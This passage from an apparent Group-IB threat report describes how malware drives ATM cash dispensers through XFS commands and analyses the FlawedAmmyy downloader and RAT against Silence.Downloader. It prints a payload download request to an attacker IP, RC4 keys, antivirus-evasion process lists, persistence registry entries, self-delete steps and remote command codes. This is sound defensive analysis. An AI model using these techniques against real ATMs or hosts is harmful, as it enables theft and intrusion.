using\nthe same method as in version 2 (described above).\n\n5. Receives information about cassettes and banknotes in the same way as in version\n2 (described above).\n\n6. Cash is then withdrawn by calling the WFSExecute function with the flag dwCommand ==\nWFS_CMD_CDM_DISPENSE (dispensing banknotes from cassettes).\n\n7. If an error with the code -306 occurs, the WFSExecute function is called with the\ndwCommand == WFS_CMD_CDM_PRESENT flag to open the shutter and cause banknotes\nto be dispensed.\n\n8. The steps for collecting data about cassettes and dispensing cash are repeated four times\nin a cycle .\n\n9. Re-sends the RESET command to CDM.\n\nIf the version of the dispenser service provider is 3 and the application has been started with the\ncommand line argument --exchange:\n\n1. CMD is set to RESET mode by calling the function WFSExecute with the flag\ndwCommand == WFS_CMD_CDM_START_EXCHANGE.\n\nCommand description from the specification:\n\n\nWFS_CMD_CDM_START_EXCHANGE\n\nDescription This command puts the CDM in an exchange state, i.e. a state in which cash units\ncan be emptied, replenished, removed or replaced.\n\n\n2. \u0007CMD terminates RESET mode by calling the WFSExecute function with the flag\ndwCommand == WFS_CMD_CDM_END_EXCHANGE.\n\n\nWFS_CMD_CDM_END_EXCHANGE\n\nDescription This command will end the exchange state. If any physical action took place as a\nresult of the WFS_CMD_CDM_START_EXCHANGE command then this command will cause the cash units\nto be returned to their normal physical state. Any necessary device testing will also be\ninitiated.\n\nThe application can also use this command to update cash unit information in the form\ndescribed in the documentation of the WFS_INF_CDM_CASH_UNIT_INFO command.\n\nIt modifies the WFSCDMCUINFO structure (and the structure WFSCDMCASHUNIT embedded in it),\nwhich is passed as an argument when calling the function WFSExecute(WFS_CMD_CDM_END_EXCHANGE)\n\n\n-----\n\n-----\n\n### FLAWEDAMMYY ANALYSIS  AND ITS COMPARISON WITH  SILENCE.DOWNLOADER\n\nThe analysis of Silence’s activities by Group-IB experts revealed that FlawedAmmyy.Downloader\nand Silence.Downloader are written by the same person. That said, the infrastructure used for\nFlawedAmmyy attacks differs greatly from Silence attacks, which means the attacks themselves\nare not interrelated.\n\nSince early summer 2018, FlawedAmmyy.Downloader has been used in attacks on various targets\nin various regions. Some researchers believe this tool is used by the TA505 group to conduct\nits operations.\n\n\n-----\n\n-----\n\nThe file contains gibberish (shown below), which is most likely used to bypass antivirus emulators.\n\nThe file will terminate its operation once it has detected that one of the following processes\nbelonging to antivirus solutions is running: QHACTIVEDEFENSE.EXE, QHSAFETRAY.\nEXE, QHWATCHDOG.EXE, CMDAGENT.EXE, CIS.EXE, V3LITE.EXE, V3MAIN.EXE, V3SP.\nEXE, EGUI.EXE, EKRN.EXE, SPIDERAGENT.EXE, DWENGINE.EXE, DWARKDAEMON.EXE,\nBULLGUARDTRAY.EXE, BDAGENT.EXE, BULLGUARD.EXE, BDSS.EXE, or BULLGUARD.EXE.\n\nIn the event that the file has been launched under an administrator account, it performs the\nfollowing actions:\n\n1. Terminates the process named wsus.exe four times in a row (if it is present);\n\n2. Deletes the following AMMYY files, if they are present:\n\n%COMMON_APPDATA%\\\\AMMYY\\\\wmihost.exe\n\n%COMMON_APPDATA%\\\\AMMYY\\\\settings3.bin\n\n%COMMON_APPDATA%\\\\Foundation\\\\wmites.exe\n\n%COMMON_APPDATA%\\\\Foundation\\\\settings3.bin\n\n%COMMON_APPDATA%\\\\Foundation1\\\\wmites.exe\n\n%COMMON_APPDATA%\\\\Foundation1\\\\settings3.bin\n\n%COMMON_APPDATA%\\\\Microsoft\\\\wsus.exe\n\n%COMMON_APPDATA%\\\\Microsoft\\\\settings3.bin\n\n%COMMON_APPDATA%\\\\Microsoft Help\\\\wsus.exe\n\n%COMMON_APPDATA%\\\\Microsoft Help\\\\settings3.bin\n\n%COMMON_APPDATA%\\\\Microsofts Help\\\\wsus.exe\n\n%COMMON_APPDATA%\\\\Microsofts Help\\\\settings3.bin\n\n3.

Terminates the process named wsus.exe twice in a row (if it is present).\n\n6. Creates the following directory: %COMMON_APPDATA%\\\\Microsofts Help.\n\n\n-----\n\n7. \u0007Downloads an encrypted file from the network host http://31.207.45[.]85/d.dat and saves\nit under the name of the form %COMMON_APPDATA%\\Microsofts Help\\temp_[random_\ndword].FOOP0xFCBEEA. An example of file location on disk: C:\\ProgramData\\Microsofts\nHelp\\temp_84c350.FOOP0xFCBEEA.\n\nThe file is requested from a remote node using GET requests via unencrypted HTTP. An example\nof a file request is shown below:\n\n\nGET /d.dat HTTP/1.1\n\nHost: 31.207.45[.]85\n\nCache-Control: no-cache\n\n\n8. \u0007Reads and decrypts the contents of the file %COMMON_APPDATA%\\Microsofts Help\\\ntemp_[random_dword].FOOP0xFCBEEA. For decryption, the RC4 algorithm is used with the\nkey ZAKDSh327uif.\n\n9. \u0007Writes the decryption result (unencrypted file) to the file %COMMON_APPDATA%\\\nMicrosofts Help\\\\wsus.exe.\n\n10. \u0007Removes the temporary file %COMMON_APPDATA%\\Microsofts Help\\temp_[random_\ndword].FOOP0xFCBEEA.\n\n\u0007If the first two bytes of the decrypted file are not the “MZ” characters – which means the\nexecutable file has not been decrypted correctly – the file will be terminated and selfremoved. The self-deletion is performed by running the shell with the arguments\n/del [exefile] >> NUL.\n\n11. Following this, it executes the decrypted file %COMMON_APPDATA%\\Microsofts Help\\\\\nwsus.exe.\n\n12. If the file has been successfully launched, it will re-delete the temporary file.\n\n13. Adds the launched file to autostart. This is done in one of three ways:\n\na. Autostart via system registry:\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\n“MicrosoftsSOftWare”= %COMMON_APPDATA%\\Microsofts Help\\\\wsus.exe\n\nb. By creating a delayed task in Windows Task Scheduler:\n\nThe task has the name Microsoft Window Center, starts when the current user logs\nin to the account, and has a specific feature: a hard-coded initial activation date, which\nis not important for autostart due to the presence of the condition that the file is launched\nwhen the user is logging in.\n\nc. \u0007By creating a delayed task using COM and connecting to a objectCLSID_TaskScheduler\nclass object:\n\n\n-----\n\n.rdata:0048AFE8 ; const ServerApp::`vftable'\n\n.rdata:0048AFE4         dd offset ??ServerApp@@6B@ ; const ServerApp::`RTTI Complete\nObject Locator'\n\n.rdata:0048AFE8 ; const ServerApp::`vftable'\n\n.rdata:0048AFE8 ??_7ServerApp@@6B@ dd ofset unknown_libname_3f\n\n.rdata:0048AFEC        dd offset Init\n\n.rdata:0048AFF0         dd offset server_start\n\n.rdata:0048AFF4         dd offset server_stop\n\n\n-----\n\nThe first (pre-initialisation of the application) and the second (server start) methods are called:\n\n- \u0007Compared to the original source code, initial functions that are used to check the command\nline arguments of the application, such as AmmyyApp::ParseCommandLine(), etc., have been\nremoved from the file. The launch is hardcoded: either as a service or as an application,\nwithout additional unnecessary application execution options.\n\n- \u0007Depending on how the .exe file (an application or service) has been started, a particular\nfunction will be executed.\n\nOther changes compared to the source code:\n\n- the name of the log file has been changed from AMMYY_service.log to service.log;\n\n- \u0007the name (description) of the service (AMMYYSERVICENAME AmmyyAdmin) has been\nchanged to FossPass;\n\n- \u0007the name of the service, which is used to name the application saved in the registry, has\nbeen changed to netsxuid.\n\nThe service name is saved in the registry as follows:\n\n\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services]\n\n“netsxuid”=<rnd_dword>\n\n\nA binary comparison of the sample and the legitimate versions of the Ammyy Admin application\nshows that they differ greatly.\n\nThe sample has new features that are not included in the legitimate application, redesigned\ncode structure, and data whose creation would have been impossible without recompiling the\napplication’s source code.\n\nAll these facts indicate that the file is a modified version of the published source code.\n\nTwo modifications have been added to the TrClient::Run() function, which is called while\nconnecting to the CnC and sending and receiving commands:\n\n- \u0007After connecting to the CnC server (the ConnectToRouter() function), the application collects\ndata about the compromised system and sends it to the CnC;\n\n- \u0007Below is a list of supported AMMYY command types. Each type of command corresponds\nto a specific command that can be received remotely from an attacker (CnC) and executed.\n\n\n-----\n\n{\n\n// viewer <-> target both ways\n\naaNop = 10,\n\naaPingRequest = 11, // uses by Router also\n\naaPingReply  = 12,           // uses by Router also\n\naaSound = 13,\n\naaCutText = 14,\n\n// target -> viewer\n\naaScreenUpdate = 21,\n\naaSetColourMapEntries = 22,\n\naaPointerMove = 23,\n\naaError = 24,\n\naaDesktopUnavailable = 25,\n\n// viewer -> target\n\naaSetEncoder = 40,\n\naaDesktopOFF = 41,\n\naaSetPointer = 42,\n\naaScreenUpdateRequest = 43,  // full screen update request\n\naaScreenUpdateCommit = 44,\n\naaKeyEvent = 45,\n\naaPointerEvent = 46,\n\naaRDP         = 47,\n\naaDirectConnect = 48,\n\naaSpeedTest             = 49,\n\n// FileManager: viewer -> target\n\naaFileListRequest = 60,\n\naaFolderCreateRequest = 61,\n\naaRenameRequest = 62,\n\naaDeleteRequest = 63,\n\naaDnloadRequest = 64,\n\naaUploadRequest = 65,\n\naaUploadData =   66,\n\naaUploadDataLast = 67,\n\naaDnloadDataAck = 68,\n\n// FileManager: target -> viewer\n\naaFmReply = 70,\n\naaUploadDataAck = 71,\n\naaDnloadData = 72,\n\naaDnloadDataLast = 73,\n\n};\n\n\n-----\n\nCompared to the original source code, commands with the codes 50, 51, 52, 53, 54, 55 have\nbeen added to the examined file. The table below shows the values of the added command types:\n\n**Command** **Function**\n\n50 Run an arbitrary command and store its output\n\n51 No operation\n\n52 Collect and upload system information\n\n53 Extract an executable file from resources, run it and save the results of its operation\nto the file log.txt.\n\n54 System reboot\n\n55 Self-removal\n\nOnce command 53 is received, the application extracts one of the executable files (for x86 or x64\narchitecture) from the resources of the application, saves it under the name %Temp%\\default.\nbin, executes it, and saves the results of its operation into the file log.txt. The analysed sample\ndoes not contain executable files that are extracted when command 53 is received. However,\nbased on the debug information and features of the function code, it can be suggested that the\nresources may contain Mimikatz, an application designed to retrieve user credentials.\n\nThe path to the directory on the attacker's PC where the malicious file has been assembled\nis s:\\new stage\\freelance\\ice\\clear_av_ammy\\1\\clear\\ammyygeneric\\get\\.\n\n###### Comparison of FlawedAmmy.Downloader  with Silence.Downloader\n\nDuring the analysis of new FlawedAmmy samples, we noted the following similarities\nto Silence.Downloader:\n\n- File names\n\n- Similar code fragments\n\n- Code obfuscation methods used.\n\nHaving studied the two files, we can conclude that these are two different tools with many\nconnections between them.\n\nSilence.Downloader is a universal resident loader, which collects system data, sends it to the CnC,\nadds itself to startup, and receives commands to download any files from the remote attacker.\n\nFlawedAmmy.downloader is a target non-resident loader for the FlawedAmmy tool, which\nconfigures the system to start a service called foundation, downloads and launches the file,\nand then deletes itself.\n\nGroup-IB specialists analysed the following samples:\n\n\n-----\n\n1. A file named\n\n\"600e1adba4983692e9b74e631e155eab65279dd2ab73bb35fbd6e0e84d0e68a5\"\n(размер 126976 байт, MD5 94531c20462f69c6135c4d0a06925471)\n\nwhich is a FlawedAmmyy RAT loader.\n\n2. A file named\n\n\"18462ae676c539b2a3626a7b465123b20c88bd68342777a090f40b7dcb7ace0d\"\n(размер 115200 байт, MD5 914F6BA6A3A043ECC961296FA94A6BAD)\n\nwhich we classify as Silence.Downloader.\n\n**Common characteristics of the samples:**\n\n- The same programming language, development environment and the same version were used\nfor compilation – Visual Studio 2013 (based on information extracted from the Rich header\nof the executable file);\n\n- Identical technique for generating a non-executable code portion containing multiple fake API\ncalls (without a single argument). This technique is designed to generate legitimate-seeming\nimport tables and complicate its detection by heuristic antivirus methods.\n\n- For generation, a function from Windows API – CoCreateGuid() – is used. It generates\na unique 128-bit number. The result of the function is written to the GUID structure. Below\nis a formal definition of the GUID structure:\n\n\ntypedef struct _GUID {\n\nDWORD Data1;\n\nWORD Data2;\n\nWORD Data3;\n\nBYTE Data4[8];\n\n};\n\n\n\u0007Both files use only a part of the fields from this structure. As a result, the number will\nbe calculated using the following formula:\n\nFor FlawedAmmy.Downloader:\n\n\nGUID_INT = GUID.Data3 + GUID.Data1 * GUID.Data2\n\n\nFor Silence.Downloader:\n\n\nGUID_INT = GUID.Data1 * GUID.Data2 + GUID.Data3 + 0xCB6\n\nGUID_INT = GUID.Data1 * GUID.Data2 - GUID.Data3 + 0xD435\n\n\nFor FlawedAmmyy.Downloader, decrypted files will be saved to the following path:\n\n\n-----\n\n%COMMON_APPDATA%\\Microsofts HeIp\\template_[GUID_INT].DATAHASH\n\n\nFor Silence.Downloader, decrypted files will be saved to the following path:\n\n\n%APPDATA%\\[GUID_INT].dates (a temporary encrypted fle)i\n\n%APPDATA%\\CHROME-[GUID_INT].exe (a decrypted file)\n\n\n\n- \u0007The same criteria are used to check the size of the downloaded file. The file size must exceed\n4,000 bytes. This is a rather unique number, which is used instead of typical 4096 or 1024.\n\n- \u0007The same criterion is used to check the contents of the downloaded file. The first two bytes\nof the file are checked, and they must be equal to “MZ”, which corresponds to the header\nof the executable file.\n\n- \u0007A specific sequence of steps taken to download the file, which includes sending a request,\nwriting a CnC response to the file, reading the file, checking whether the file size is over\n4,000 bytes, checking for MZ, decrypting the file, saving the decrypted file, and executing\nthe file.\n\n\u0007 \u0007An unusual detail in this sequence is that in both samples the size of the downloaded content\nis checked after the file has been written to disk. If the CnC returns <= 4000 bytes, however,\nwriting the CnC response to the file will not be necessary at all. In both samples, this check\nis made after the response has been written to the file.\n\n\u0007Another non-typical feature is that after the server response is written to the file, two\nchecks are performed, during which the written file is read and its contents are decrypted\nand rewritten into the same file. This sequence contains many redundant steps: it would\nbe sufficient to simply perform a request to the CnC, compare its length to 4,000, decrypt\nthe response and write it to the file in the event of its first two bytes being equal to “MZ”.\nThe presence of such redundant and similar stages may indicate that the code was borrowed\nand copied from other projects.\n\n- Similar values of the delay function arguments.\n\n- Identical RC4 decryption algorithm for downloaded files.\n\n\u0007The decryption key of the downloaded files is Pqoi73jGdjwenYew33 for the FlawedAmmyy\nRAT loader, and jgsi23894uhnfjusiof for Silence.Downloader (for decrypting non-file\ndata, for example, commands from server responses. Silence.Downloader has other keys:\nFKh23yu7T*&^@# and WiJyQaEaAixoRyCu).\n\n- Identical self-removal code.\n\n- The same set of API functions used.\n\n**Differences between the samples:**\n\n- \u0007FlawedAmmy.Downloader is non-resident. This means that it starts, downloads and runs the\nfile and deletes itself.\n\n- \u0007Silence.Downloader is resident. It copies itself to %All Users\\Application Data%\\WIN7Z\\\n\n\n-----\n\nwsus.exe, then adds itself to startup (the Run registry key) and executes requests to the\nCnC in a cycle with an interval of 2 minutes. It removes itself only when it receives the KILL\ncommand from CnC.\n\n**Criterion** **Value in FlawedAmmyy.Downloader** **Value in Silence.Downloader**\n\nDevelopment environment Visual Studio 2013 Visual Studio 2013\nused\n\nGibberish import table Yes Yes\n\n\nMethod of generating\ndownloaded file names using\nGUID and the CoCreateGuid()\nfunction\n\n\nYes Yes\n\n\nChecking the downloaded Over 4,000 bytes Over 4,000 bytes\nfile size\n\nChecking the contents of the The first 2 bytes - “MZ” The first 2 bytes - “MZ”\ndownloaded file\n\n\nFile download steps Sending a request, writing a CnC response to a\nfile, reading the file, checking if the file size is\nover 4,000 bytes, checking for MZ, decrypting\nthe file, saving the decrypted file, executing\nthe file.\n\nArgument values of the delay Sleep(5000);\nfunction Sleep(3000);\nSleep(3000);\nSleep(1000);\n\n\nSending a request, writing a CnC response\nto a file, reading the file, checking if the file\nsize is over 4,000 bytes, checking for MZ,\ndecrypting the file, saving the decrypted\nfile, executing the file.\n\nSleep(1000);\nSleep(50);\nSleep(3000);\nSleep(3000);\nSleep(3000);\nSleep(3000);\nSleep(5000);\nSleep(120000);\n\n\nDecryption algorithm for RC4 RC4\ndownloaded files\n\nAPI call method Dynamic search Static call from an import table\n\nLoader type Non-resident Resident\n\nIs the wsus.exe file name used?

Windows version, OS bitness\n\nIs the collected data sent No Yes\nto the CnC?\n\nAre requests to the CnC No Yes\nencoded additionally?\n\n\n-----\n\n###### FlawedAmmyy infrastructure\n\nThe servers used by FlawedAmmyy are not located where Silence usually hosts them. The\nhypothesis that these attacks are not connected is also supported by the fact that the emails\ncontaining FlawedAmmyy differ greatly from those used by Silence and are delivered to both\nindividuals and companies.\n\n**Downloaders**\n\n25/05/2018 f4b6b0c8787ea344ce9f68f5d506a5d6cc7447114b3d- http://clodflarechk[.]com/cloud.png\ncdbb6d0207372054dfe2\n\n25/05/2018
